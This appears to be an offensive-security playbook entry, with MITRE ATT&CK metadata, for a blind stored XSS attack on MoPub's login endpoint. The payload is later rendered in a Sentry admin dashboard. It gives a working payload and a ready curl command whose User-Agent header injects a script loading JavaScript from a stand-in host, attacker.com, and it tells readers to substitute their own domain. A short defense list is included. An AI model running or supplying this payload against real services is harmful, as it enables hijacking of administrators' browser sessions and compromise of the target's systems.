---
tags:
  - xss
  - blind-xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/inject-xss-user-agent-mopub]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:52:49.984Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 59dc438e-bc90-455d-a176-85dad4feec0e
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-Blind-XSS-Payload-via-User-Agent-Header

## Summary

This procedure injects a Blind Stored XSS payload into the User-Agent header of a request to the MoPub login endpoint, which is processed and stored for later unsafe reflection in the Sentry admin dashboard, enabling remote code execution without immediate feedback.

## Description

The attack targets the https://demand.mopub.com/accounts/login/ endpoint, where the User-Agent header is captured and later displayed in the http://sentry-test.mopub.com/exchange-marketplace/marketplace-admin-production/ dashboard within an <option> tag without proper HTML encoding. The payload escapes the HTML context, closes tags, and injects a script tag to load external JavaScript. This is a blind attack as execution occurs only when an admin views the dashboard. Prerequisites include network access to the endpoint and control of an external domain for hosting the payload script.

## Requirements

1. Ability to send custom HTTPS requests (e.g., via curl or browser dev tools)
2. Control over a domain to host the malicious JavaScript (e.g., attacker.com/js)
3. Knowledge of the target endpoint URL

## Defense

Defensive measures and detection strategies:

- Sanitize and HTML-encode all user-controlled inputs, especially headers like User-Agent, before rendering in HTML contexts
- Implement Content Security Policy (CSP) to block inline scripts and external script loads
- Monitor for anomalous User-Agent strings in logs and dashboard access patterns

## Objectives

1. Plant a persistent XSS payload in the application's data store
2. Achieve context escape in the admin dashboard's <option> tag
3. Set up for arbitrary JavaScript execution upon admin access

## Instructions

### Step 1: Craft the Payload

**Context**: Design a payload that closes the <option> tag, escapes HTML contexts, and injects a script to load external JS. The payload used is '>"</title></style></textarea></script><script/src=attacker.com/js></script>.

No command needed; prepare the string for the User-Agent header.

### Step 2: Send the Injection Request

**Context**: Use curl to send the GET request with the payload in User-Agent, mimicking a legitimate login attempt.

**Command** ([[commands/inject-xss-user-agent-mopub]]):
```bash
curl -X GET "https://demand.mopub.com/accounts/login/" \
  -H "Host: demand.mopub.com" \
  -H "Referer: 1" \
  -H "User-Agent: '>"</title></style></textarea></script><script/src=attacker.com/js></script>" \
  -H "X-Forwarded-For: 1" \
  -H "X-OrigHost: demand.mopub.com" \
  -H "Accept-Encoding: gzip,deflate" \
  -H "Accept: */*"
```

> This sends the request; the payload is stored. Expected output: HTTP response (e.g., 200 OK or redirect) without errors. Replace attacker.com/js with your domain.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/inject-xss-user-agent-mopub]]

## Tools Used


## Tags

- [[xss]]
- [[blind-xss]]
- [[injection]]
